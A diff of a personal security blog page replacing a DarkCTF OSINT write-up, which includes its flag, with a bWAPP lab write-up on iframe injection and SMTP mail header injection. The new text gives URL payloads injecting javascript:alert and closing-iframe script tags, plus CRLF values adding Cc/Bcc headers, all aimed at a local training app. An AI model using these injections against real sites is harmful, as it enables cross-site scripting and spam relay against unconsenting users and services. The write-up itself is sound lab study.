@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DarkCTF Official Writeup - Dark Social Web, CTF, OSCP, Cyber Security, Blockchain">
+    <meta name="keywords" content="BWAPP IFrame and SMTP Injection, CTF, OSCP, Cyber Security, Blockchain">
     <meta name="description" content="Mukhilan Pari Personal Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>DarkCTF Official Writeup - Dark Social Web | Mukhilan</title>
+    <title>BWAPP IFrame and SMTP Injection | Mukhilan</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/writeups/darkctf/darkkkk-nobg.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DarkCTF Official Writeup - Dark Social Web</h1>
+                    <h1 class="description center-align post-title">BWAPP IFrame and SMTP Injection</h1>
                 </div>
             </div>
         </div>
@@ -446,20 +446,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/DarkCTF/">
-                                <span class="chip bg-color">DarkCTF</span>
-                            </a>
-                        
-                            <a href="/tags/DarkArmy/">
-                                <span class="chip bg-color">DarkArmy</span>
-                            </a>
-                        
-                            <a href="/tags/Writeups/">
-                                <span class="chip bg-color">Writeups</span>
-                            </a>
-                        
-                            <a href="/tags/Osint/">
-                                <span class="chip bg-color">Osint</span>
+                            <a href="/tags/Bwapp/">
+                                <span class="chip bg-color">Bwapp</span>
                             </a>
                         
                     </div>
@@ -483,21 +471,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-10-01
+                    2019-01-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-10-01
+                    2020-09-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    240
+                    306
                 </div>
                 
 
@@ -519,29 +507,21 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Dark-Social-Web"><a href="#Dark-Social-Web" class="headerlink" title="Dark Social Web"></a>Dark Social Web</h1><blockquote>
-<p>Points: <code>472</code></p>
-</blockquote>
-<blockquote>
-<p>Author: <code>Catamob, Whitewolf</code></p>
-</blockquote>
-<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
-<p>0xDarkArmy has 1 social account, and DarkArmy uses the same name everywhere. Hint: The front page of internet<br>Hint: the front page of the internet<br>flag format: darkctf{}</p>
-</blockquote>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We already have accounts on Twitter and Instagram with the same username for a long time. But we didn’t advertise Reddit and the one community with r/0xDarkArmy and user account with u/0xDarkArmy.</p>
-<p>People who don’t know our Reddit account can be found from the hint that the Reddit’s slogan is “The Front page of the internet”.</p>
-<p>Alternative:<br><a target="_blank" rel="noopener" href="https://github.com/sherlock-project/sherlock">https://github.com/sherlock-project/sherlock</a></p>
-<pre class=" language-python"><code class="language-python">python3 sherlock 0xDarkArmy</code></pre>
-<p>Sherlock will give you the intended result of social media accounts.</p>
-<p>In r/0xDarkArmy, there is a pinned post as below, </p>
-<p><img src="/medias/writeups/darkctf/social1.png" alt="Social 1"></p>
-<p>0xDarkArmy’s comment saying DarkSecret in the profile, One post in u/0xDarkArmy says spoiler contains and it contains the QR code to a .onion website.</p>
-<p><img src="/medias/writeups/darkctf/social2.png" alt="Social 2"></p>
-<p>Tor is needed for opening .onion sites, in that 1st part of the flag is in robots.txt and 2nd part of the flag is in the request body as flag header,</p>
-<p><img src="/medias/writeups/darkctf/social3.png" alt="Social 2"></p>
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote>
-<p>darkctf{S0c1a1_D04k_w3b_051n7}</p>
-</blockquote>
+                <h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="IFrame-Injection"><a href="#IFrame-Injection" class="headerlink" title="IFrame Injection:"></a>IFrame Injection:</h2><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>By viewing the source code page, construct the payload accordingly.</p>
+<p>payloads to be used are,</p>
+<pre><code>localhost/bwapp/iframei.php?ParamUrl=https://www.mukhilan.com&amp;ParamWidth=250"&amp;ParamHeight=250
+localhost/bwapp/iframei.php?ParamUrl=javascript:alert(1)&amp;ParamWidth=250%22&amp;ParamHeight=250</code></pre>
+<p>The source code is,</p>
+<pre><code>&lt;iframe frameborder="0" src="&lt;?php echo xss($_GET["ParamUrl"])?&gt;" height="&lt;?php echo xss($_GET["ParamHeight"])?&gt;" width="&lt;?php echo xss($_GET["ParamWidth"])?&gt;"&gt;&lt;/iframe&gt;</code></pre>
+<h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><pre><code>localhost/bwapp/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250%22%3E%3C/iframe%3E%3Cscript%3Ealert(1);%3C/script%3E&amp;ParamHeight=250</code></pre>
+<p>payload is <code>"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code>.<br>Iframe’s last parameter is width. So, Payload should inject after paramWidth.</p>
+<p>The source code is,</p>
+<pre><code>&lt;iframe frameborder="0" src="robots.txt" height="&lt;?php echo xss($_GET["ParamHeight"])?&gt;" width="&lt;?php echo xss($_GET["ParamWidth"])?&gt;"&gt;&lt;/iframe&gt;</code></pre>
+<h2 id="Mail-Header-Injection-SMTP"><a href="#Mail-Header-Injection-SMTP" class="headerlink" title="Mail Header Injection (SMTP):"></a>Mail Header Injection (SMTP):</h2><p>In this, if the input field in the contact page is not filtered correctly. Then we can add extra content to the SMTP Header as below.</p>
+<p>In mail field, payload can be <code>exp1@exp1.com\r\nCc:exp@exp.com</code> or <code>exp1@exp1.com\r\nbcc:exp@exp.com</code>.</p>
+<p>Check the link in the reference section, Acunetix gave a good explanation of this vulnerability.</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.acunetix.com/blog/articles/email-header-injection/
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -585,7 +565,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://mukhilan.com/Writeups/darkctf-official-dark-social-web/">http://mukhilan.com/Writeups/darkctf-official-dark-social-web/</a>
+                    <a href="http://mukhilan.com/bwapp-iframe-smtp/">http://mukhilan.com/bwapp-iframe-smtp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -623,20 +603,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/DarkCTF/">
-                                    <span class="chip bg-color">DarkCTF</span>
-                                </a>
-                            
-                                <a href="/tags/DarkArmy/">
-                                    <span class="chip bg-color">DarkArmy</span>
-                                </a>
-                            
-                                <a href="/tags/Writeups/">
-                                    <span class="chip bg-color">Writeups</span>
-                                </a>
-                            
-                                <a href="/tags/Osint/">
-                                    <span class="chip bg-color">Osint</span>
+                                <a href="/tags/Bwapp/">
+                                    <span class="chip bg-color">Bwapp</span>
                                 </a>
                             
                         </div>
@@ -681,7 +649,7 @@
         repo: 'mukhilanpari.github.io',
         owner: 'mukhilanpari',
         admin: "mukhilanpari",
-        id: '2020-10-01T20-12-05',
+        id: '2019-01-21T00-00-00',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -709,30 +677,34 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/Writeups/darkctf-official-chain-race/">
+                <a href="/multi-factor/">
                     <div class="card-image">
                         
-                        <img src="/medias/writeups/darkctf/darkkkk-nobg.png" class="responsive-img" alt="DarkCTF Official Writeup - Chain Race">
+                        <img src="/medias/projects/multi/logo.png" class="responsive-img" alt="MULTI-FACTOR AUTHENTICATION SCHEME FOR ONLINE EXAMINATION">
                         
-                        <span class="card-title">DarkCTF Official Writeup - Chain Race</span>
+                        <span class="card-title">MULTI-FACTOR AUTHENTICATION SCHEME FOR ONLINE EXAMINATION</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DarkCTF conducted by DarkArmy Official Writeup of Chain Race challenge
+                            Scheme for implementation of Multifactor Authentication
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-01
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-01-27
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Writeups/" class="post-category">
-                                    Writeups
+                            <a href="/categories/Paper/" class="post-category">
+                                    Paper
+                                </a>
+                            
+                            <a href="/categories/Paper/Project/" class="post-category">
+                                    Project
                                 </a>
                             
                             
@@ -742,20 +714,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/DarkCTF/">
-                        <span class="chip bg-color">DarkCTF</span>
+                    <a href="/tags/python/">
+                        <span class="chip bg-color">python</span>
                     </a>
                     
-                    <a href="/tags/DarkArmy/">
-                        <span class="chip bg-color">DarkArmy</span>
+                    <a href="/tags/Paper/">
+                        <span class="chip bg-color">Paper</span>
                     </a>
                     
-                    <a href="/tags/Writeups/">
-                        <span class="chip bg-color">Writeups</span>
-                    </a>
-                    
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/tags/Project/">
+                        <span class="chip bg-color">Project</span>
                     </a>
                     
                 </div>
@@ -769,23 +737,24 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/Writeups/darkctf-official-secret-contract/">
+                <a href="/bwapp-os-injection/">
                     <div class="card-image">
                         
-                        <img src="/medias/writeups/darkctf/darkkkk-nobg.png" class="responsive-img" alt="DarkCTF Official Writeup - Secret of the Contract">
                         
-                        <span class="card-title">DarkCTF Official Writeup - Secret of the Contract</span>
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="BWAPP OS Command Injection /Blind">
+                        
+                        <span class="card-title">BWAPP OS Command Injection /Blind</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DarkCTF conducted by DarkArmy Official Writeup of Secret of the Contract challenge
+                            BWAPP OS Command Injection /Blind solution
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-01-21
                             </span>
                         <span class="publish-author">
                             
@@ -802,20 +771,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/DarkCTF/">
-                        <span class="chip bg-color">DarkCTF</span>
-                    </a>
-                    
-                    <a href="/tags/DarkArmy/">
-                        <span class="chip bg-color">DarkArmy</span>
-                    </a>
-                    
-                    <a href="/tags/Writeups/">
-                        <span class="chip bg-color">Writeups</span>
-                    </a>
-                    
-                    <a href="/tags/blockchain/">
-                        <span class="chip bg-color">blockchain</span>
+                    <a href="/tags/Bwapp/">
+                        <span class="chip bg-color">Bwapp</span>
                     </a>
                     
                 </div>
